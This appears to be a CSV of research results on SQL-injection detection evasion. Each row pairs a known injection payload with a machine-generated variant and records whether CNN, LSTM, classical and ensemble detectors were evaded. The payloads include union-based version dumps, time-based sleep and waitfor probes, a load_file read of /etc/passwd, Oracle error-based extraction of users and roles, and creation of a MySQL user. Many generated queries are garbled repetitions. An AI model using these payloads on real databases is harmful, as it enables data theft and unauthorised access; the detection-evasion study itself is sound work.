,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
123," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1","SELECT * FROM * FROM SQL_injection WHERE id = 1 ||1 union select 1,banner FROM v$version WHERE rownum = 1 AND 1 = ""SQL""",1,1,1,0,0,0,0
124," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",SELECT MIN(1) FROM SQL injection detection,1,1,1,0,1,1,0
125,"admin""  )   or   (  ""1""  =  ""1",SELECT MIN(1) FROM SQL injection detection,1,1,1,0,1,1,0
126," select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR 1##@ union select 'a',version ( ) -- 1",1,1,1,0,0,0,0
127,"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #","SELECT COUNT(*) FROM SQL AS _number WHERE NOT SQL_injection = ""valid""",1,1,1,1,1,1,1
128," select * from users where id  =  1 union select .1_,version  (    )   -- 1",SELECT MIN(version) FROM SQL injection detection,1,0,1,1,1,1,1
129, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,"SELECT SELECT SELECT SELECT SELECT FROM SQL injection, COUNT(*) FROM query: AND 1 = utl_inaddr.get_host_address.get_host_address.get_host_address.get_host_address.get_host_address.get_host_address.get_host_address.get_host_address.get_host_address.get_host_address FROM DUAL SELECT SELECT FROM SQL injection' AND NOT SELECT - SELECT MIN((SELECT MIN((SELECT MIN((SELECT MIN((SELECT MIN((SELECT_host_address.get_host_address.get_host_address) FROM SELECT SELECT MIN(SELECT MIN(SELECT FROM SQL injection) FROM 'utl_inaddr.get_host_address.get_host_address) FROM SELECT SELECT SELECT MIN(SEL",0,1,1,1,1,1,1
130," or 0  =  0 #""",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
131,select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,SELECT * FROM * FROM SQL injection detection WHERE id = 1 OR 1 = 1,1,1,1,0,1,1,0
132,select * from users where id  =  1 %!<@ or 1  =  1 -- 1,SELECT * FROM * FROM SQL injection detection WHERE id = 1 %!@ or 1 = 1,1,1,0,0,0,0,0
133,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",SELECT MIN(sequence) FROM SQL injection - SELECT MIN(sequence) FROM SQL_injection),1,1,1,1,1,1,1
134,1  )   or sleep  (  __TIME__  )  #,"SELECT * FROM SQL AS __TIME__, ORDER BY * DESC LIMIT 1",0,0,1,1,0,1,0
135," select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""1_"" OR 1 = 1 AND 1 = 1",0,1,1,0,0,0,0
136," select * from users where id  =  1 <1## union select 1,version  (    )   -- 1","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = 1 1## union select 1,version ( ) -- 1",1,1,0,0,0,0,0
137," select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1","SELECT * FROM * FROM * FROM users WHERE NOT id = 1 + $+* union select null,@@VERSION -- 1",1,1,1,0,1,1,0
138,select * from users where id  =  1. <@ or 1  =  1 -- 1,SELECT * FROM * FROM SQL injection detection WHERE id = 1 @ or 1 = 1,1,1,1,0,0,0,0
139, or true--,SELECT NOT SQL_inject FROM SQL AS T1 JOIN query: or true-- SELECT generated FROM query: or true--,0,1,1,1,1,1,1
140,; execute immediate 'sel' || 'ect us' || 'er',SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sel) || 'ect us' || 'er' FROM SQL injection',1,1,1,0,1,1,0
141,hi' or 'x'  =  'x';,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM query: hi' OR 'x' = 'x',1,1,0,0,1,0,0
142,select * from users where id  =  1 <@ or 1  =  1 -- 1,SELECT * FROM * FROM SQL injection detection WHERE id = 1 @ or 1 = 1,1,1,1,0,0,0,0
143," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE id = 1 OR ""."" OR 1 = 1",0,1,1,0,0,0,0
144,admin' #,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
145," select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",SELECT MIN(1) FROM SQL injection detection,1,1,1,0,1,1,0
146," select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 ORDER BY id = 1 ORDER BY id = 1,1,1,1,0,0,0,0
147," select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE id = 1 OR NOT id = 1 OR  = 1 ORDER BY 1,1,1,1,0,0,0,0
148," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
149,"""  )  ;waitfor delay '0:0:__TIME__'--",SELECT MIN(unique SQL) FROM query: '0:0:__TIME__'-- for',1,1,1,0,0,0,0
150, or 'unusual'   =   'unusual',SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
151,"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",SELECT DISTINCT'sql injection detection' FROM SQL_injection,1,0,1,1,1,1,1
152,"admin"" or ""1""  =  ""1""/*","SELECT MIN(""sql injection detection"") FROM SQL SELECT MIN(1) FROM SQL SELECT SELECT MIN(1) FROM SQL",1,1,0,0,1,0,0
153," select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1","SELECT * FROM * FROM SQL injection detection WHERE id = 1 OR ""1 ( = 1 OR 1 = 1) ORDER BY COUNT(*) DESC LIMIT 1)",0,1,0,0,0,0,0
154," select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR 1 union select 1,@@VERSION -- 1",0,1,1,0,0,0,0
155,like,"SELECT * FROM SQL AS t1 JOIN query: 'yes' FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM SQL_injector WHERE NOT SQL_inject = ""valid"" AND NOT SELECT FROM query:",0,0,1,1,1,1,1
156,or username like char  (  37  )  ;,SELECT DISTINCT SQL FROM query: or username like char ( 37 ),1,1,1,1,0,1,0
157, )    )    or pg_sleep  (  __TIME__  )  --,"SELECT __TIME__, COUNT(*) FROM SQL_injector WHERE NOT __TIME__ = ""yes""",1,1,1,0,0,0,0
158,select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,SELECT * FROM * FROM * FROM users WHERE id = 1 OR $+ or 1 = 1 AND 1 = 1,0,1,0,0,0,0,0
159,or 3  =  3,"SELECT * FROM query: or 3 = 3 WHERE NOT SQL_injection = ""valid""",1,1,0,0,1,0,0
160," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""(. or 1 = 1 AND 1 = 1",0,1,0,0,0,0,0
161,select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,SELECT * FROM * FROM * FROM users WHERE NOT id = 1 OR ( $+ ) = 1 OR 1 = 1,0,1,0,0,0,0,0
162,exec sp,"SELECT * FROM query: exec sp WHERE NOT SQL_injection = ""valid""",1,1,1,1,1,1,1
163," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR +$ union select 1,@@VERSION -- 1",1,1,1,0,0,0,0
164,select * from users where id  =  1 or \<$ or 1  =  1 -- 1,SELECT * FROM * FROM users WHERE NOT id = 1 OR $ = 1 OR 1 = 1,1,1,1,0,0,0,0
165," select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = 1 &&1 union select 1,version ( ) -- 1",1,1,0,0,0,0,0
166,admin' or 1  =  1/*,SELECT MIN(1 = 1/*) FROM SQL injection detection,1,1,0,0,1,0,0
167,a' waitfor delay '0:0:10'--,SELECT MIN(sql injection) FROM SQL Query: a' waitfor delay '0:0:10'-- for',1,1,0,0,0,0,0
168," select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
169," select * from users where id  =  1 union select .1$_,version  (    )   -- 1","SELECT MIN(SQL injection) FROM SQL_Injection WHERE NOT id = 1 union select.1$_,version ( ) -- 1",1,1,0,0,0,0,0
170,and 1 in   (  select var from temp  )  --,SELECT DISTINCT var FROM SQL injection detection,1,0,1,1,1,1,1
171,hi'  )   or   (  'a'  =  'a,SELECT DISTINCT'sql injection' FROM SQL SELECT SELECT DISTINCT 'a' FROM SQL SELECT SELECT DISTINCT 'a' FROM SQL SELECT SELECT DISTINCT 'a' FROM SQL SELECT MIN('a' = 'a'),1,0,1,0,0,0,0
172," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",SELECT MIN(SELECT) FROM (SELECT SELECT SELECT MIN(SELECT SELECT FROM) AS _local_address WHERE NOT SELECT SELECT SELECT FROM SQL_injection) AND NOT SELECT SELECT SELECT FROM SELECT SELECT SELECT MIN(SELECT) FROM (SELECT SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT FROM SQL_inaddr.get_host_address.inaddr.get_host_address.inaddr.get_host_address.inaddr.get_host_address) FROM (SELECT SELECT SELECT SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SEL,0,0,1,1,1,1,1
173,"admin"" or 1  =  1",SELECT MIN(1 = 1) FROM SQL injection detection,1,1,0,0,1,0,0
174,"""  )   or true--","SELECT * FROM SQL AS t1 JOIN query: 'yes', query: 'yes', writes: 'yes', writes: 'yes', writes: 'yes', writes: 'yes', writes: 'yes', writes: 'yes', writes: 'yes', writes: 'yes', writes: 'yes', writes: 'yes', writes: 'yes', writes: 'yes', writes: ""sql injection"" FROM sq = ""sq injection""",0,0,1,0,1,1,0
175," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'","SELECT MIN(sql injection) FROM SQL injection detection WHERE id = '1' OR $ _ 1 union select 1,@@VERSION -- 1'",1,1,1,0,0,0,0
176," select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE id = 1 OR NOT id = 1 OR  = 1 ORDER BY 1 = 1,1,1,1,0,0,0,0
177,1  )   or pg_sleep  (  __TIME__  )  --,"SELECT __TIME__, COUNT(*) FROM SQL_inject = ""valid"" AND NOT __TIME__ > ""discuss""",1,1,1,0,0,0,0
178," select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE id = 1 OR NOT id = 1 OR  = 1 ORDER BY 1,1,1,1,0,0,0,0
179,"""  )   or sleep  (  __TIME__  )    =  """,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
180,select * from users where id  =  1.<@. or 1  =  1 -- 1,"SELECT * FROM * FROM SQL injection detection WHERE id = ""1.1@. or 1 = 1 AND 1 = 1",0,1,1,0,0,0,0
181,"admin""  )   or   (  ""1""  =  ""1""--","SELECT MIN(""1"") FROM SQL injection detection",1,1,0,0,1,0,0
182," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1","SELECT MIN( ) FROM SQL injection detection WHERE NOT id = 1@. union select 1,version ( ) -- 1",1,1,1,0,0,0,0
183,; exec xp_regread,"SELECT * FROM query: ; exec xp_regread WHERE NOT SQL_regread = ""valid""",1,1,1,1,1,1,1
184," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = '1' + @ 1 union select 1,version ( ) -- 1'",1,1,1,0,0,0,0
185,select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,SELECT * FROM * FROM * FROM users WHERE id = 1 + +%1 or 1 = 1,1,1,0,0,0,0,0
186," select * from users where id  =  1 or "";1"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR "";1"" OR 1 = 1",0,1,1,0,0,0,0
187," select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR id = 1 OR id = 1 OR i = 1 ORDER BY 1 = 1,1,1,1,0,0,0,0
188,1 and 1  =  1,SELECT * FROM query: 1 AND NOT SQL_injection IS NULL,1,1,1,1,1,1,1
189,or 0  =  0 #,SELECT * FROM query: or 0 = 0,1,1,1,1,1,1,1
190,union select * from users where login   =   char ...,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
191," select * from users where id  =  1 union select 1||@,version  (    )   -- 1","SELECT MIN(version) FROM SQL injection detection WHERE NOT id = 1 union select 1||@,version ( ) -- 1",1,1,1,0,0,0,0
192,admin'  )   or '1'  =  '1'--,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
193,1;SELECT *,SELECT MIN(SELECT MIN(SELECT) FROM SQL injection detection WHERE NOT SELECT FROM query: 1;SELECT * FROM query: 1;SELECT * FROM query: 1;SELECT * FROM SQL SELECT SELECT MIN(SELECT) FROM SQL SELECT MIN(SELECT) FROM SELECT MIN(SELECT) FROM SELECT MIN(SELECT) FROM SELECT MIN(SELECT) FROM SELECT MIN(SELECTECT FROM SELECT SELECT FROM SELECT SELECT MIN(sq_injection) FROM SELECT SELECT FROM SELECT SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT) FROM SELECT SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT) FROM SELECT SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT) FROM SELECT SELECT ,0,0,1,1,1,1,1
194," select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE id = 1 OR NOT id = 1 OR ; = 1 ORDER BY 1 = 1,1,1,1,0,0,0,0
195,x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
196," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = '1' OR id = '1' OR '""@ union select 1,version ( ) -- 1'",0,1,0,0,0,0,0
197," select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""yes"" OR 1 = 1",0,1,1,0,0,0,0
198," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'","SELECT MIN(sql injection) FROM SQL_injection WHERE id = '1' ||1 union select 1,banner from v$version'",1,1,1,0,0,0,0
199,"1 or benchmark  (  10000000,MD5  (  1   )    )   #","SELECT COUNT(*) FROM SQL AS _number FROM query: 1 OR query: 1 or benchmark (10000000,MD5 ( 1 ) - 1",1,1,0,0,1,0,0
200,procedure,"SELECT * FROM query: procedure WHERE NOT SQL_injection = ""valid""",1,0,1,1,1,1,1
201,or ''  =  ',SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM query: or 'yes',1,0,1,1,1,1,1
202, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,SELECT SELECT MIN(SELECT SELECT SYS.LOGIN_USER FROM DUAL) AND NOT SELECT SELECT SELECT MIN(SELECT SELECT MIN(SELECT) FROM SQL_injection),0,1,1,1,1,1,1
203," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",SELECT SELECT FROM (SELECT SELECT SELECT MIN(ROWNUM) FROM SYS.ALL_USERS) AND NOT SELECT SELECT SELECT FROM (SELECT SELECT SELECT SELECT FROM SELECT SELECT MIN(ROWNUM) FROM SYS.ALL_USERS) AND NOT SELECT SELECT SELECT FROM (SELECT SELECT SELECT SELECT FROM SELECT SELECT MIN(SELECT FROM (SELECT AS t1 JOIN_host_address.usERNAME) FROM (SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(ROWNUM) FROM (SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(ROWNUM) FROM (SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(,0,0,1,1,1,1,1
204,\'; desc users; --,SELECT NOT SQL_inject FROM query: '; desc users; -- FROM query: ',1,1,1,1,1,1,1
205," select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR (. ) = 1,1,1,0,0,0,0,0
206,select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',SELECT * FROM SQL_injection_outputencing WHERE id = '1' OR $ 1 = 1 OR 1 = 1 AND 1 = 1,1,1,0,0,0,0,0
207,""" or """"^""","SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM query: ""done""",1,0,1,1,1,1,1
208,"""-""",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
209," select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR  = 1 union select 1,@@VERSION -- 1",1,1,1,0,0,0,0
210," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1","SELECT MIN(version) FROM SQL injection detection WHERE NOT id = 1 union select 1@$,version ( ) = 1",1,1,0,0,0,0,0
211," select * from users where id  =  1 *\ union select null,@@VERSION -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 * union select null,@@VERSION -- 1",1,1,1,0,0,0,0
212," select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",SELECT MIN( ) - 1 FROM SQL injection detection,1,1,1,1,1,1,1
213," select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR.% = 1 OR 1 = 1,1,1,0,0,0,0,0
214,admin'/*,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
215," select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""( #) or 1 = 1 AND 1 = 1",0,1,0,0,0,0,0
216,||UTL_HTTP.REQUEST,"SELECT NOT SQL_inject FROM query: ||UTL_HTTP.REQUEST = ""valid""",1,1,1,0,1,1,0
217," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",SELECT SELECT MIN(SELECT SELECT FROM (SELECT SELECT SELECT SELECT SELECT FROM sys.all_tables) AND NOT SELECT SELECT SELECT FROM (SELECT SELECT SELECT SELECT SELECT FROM SELECT SELECT SELECT SELECT FROM SELECT SELECT SELECT MIN(SELECT) FROM (SELECT SELECT SELECT SELECT MIN(SELECT FROM SQL_inaddr.get_host_address.inaddr.get_host_address.inaddr.get_host_address.inaddr.get_host_address.get_host_address) FROM (SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT,0,0,1,1,1,1,1
218," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = 1'@. union select 1,version ( ) -- 1""",1,1,1,0,0,0,0
219,"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #","SELECT COUNT(*) FROM SQL AS _number WHERE NOT SQL_injection = ""valid""",1,1,1,1,1,1,1
220," select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = 1 @.$ union select 1,version ( ) -- 1",1,1,1,0,0,0,0
221," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",SELECT * FROM SQL injection detection WHERE NOT id = 1 OR $  1,1,1,1,1,1,1,1
222,select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',SELECT * FROM SQL injection detection WHERE id = '1' @.$ or 1 = 1 AND 1 = 1,1,1,0,0,0,0,0
223,1 uni/**/on select all from where,"SELECT DISTINCT t1.uni/**/on FROM Query: 1 UNION SELECT t1.uni/**/on FROM SELECT t1.sql injection_detection FROM SQL_injection_detection AS t1 JOIN query: 1 uni/**/on JOIN query: 1 ON t1.uni/**/on = t2.sql injection_detection_detection_detection_detect SELECT MIN(uni/**/on) FROM SELECT SELECT FROM FROM SELECT SUM(SQL injection) FROM SELECT SUM(SQL_0 FROM SELECT SUM(SQL_0, SELECT SELECT MIN(sql injection) FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT SUM(SQL) FROM SELECT SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(uni/**/on) FROM SQL SELECT SELECT",0,1,1,1,1,1,1
224," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1","SELECT MIN(sql injection) FROM SQL injection detection WHERE NOT id = 1 +$. union select null,@@VERSION -- 1",1,1,1,0,0,0,0
225," select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1","SELECT NOT SQL,version ( ) FROM null,version ( ) FROM users WHERE NOT id = 1 OR 1# = 1",1,1,1,0,0,0,0
226,admin'  )   or '1'  =  '1'#,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
227,||utl_http.request  (  'httP://192.168.1.1/'  )  ||',SELECT DISTINCT'sql injection detection' FROM SQL SELECT MIN(sql injection detection) FROM query:||utl_http.request ('sql injection'),1,1,1,0,1,1,0
228,or '7659'  =  '7659,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: or '7659 = 7659',1,1,0,0,1,0,0
229," select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE id = 1 OR NOT @ OR 1 = 1,1,1,1,0,0,0,0
230," select * from users where id  =  1 union select +!<1,version  (    )   -- 1","SELECT MIN( ) FROM SQL injection detection WHERE NOT id = 1 union select +!1,version ( ) - 1",1,1,0,0,0,0,0
231," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SELECT MIN(sql injection) FROM) AND NOT SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SELECT MIN(sql injection) FROM (SELECT SELECT MIN(SELECT FROM (SELECT MIN(sql_inaddr.get_host_address.inject_role_privs) FROM (SELECT SELECT SELECT MIN(sw.write_role_privs) FROM (SELECT SELECT SELECT MIN(sw.write_host_address.inject_role_privs) FROM (SELECT SELECT SELECT SELECT MIN(sw.write_host_address.inaddr.get_host_address) FROM (SELECT SELECT SEL,0,0,0,0,1,0,0
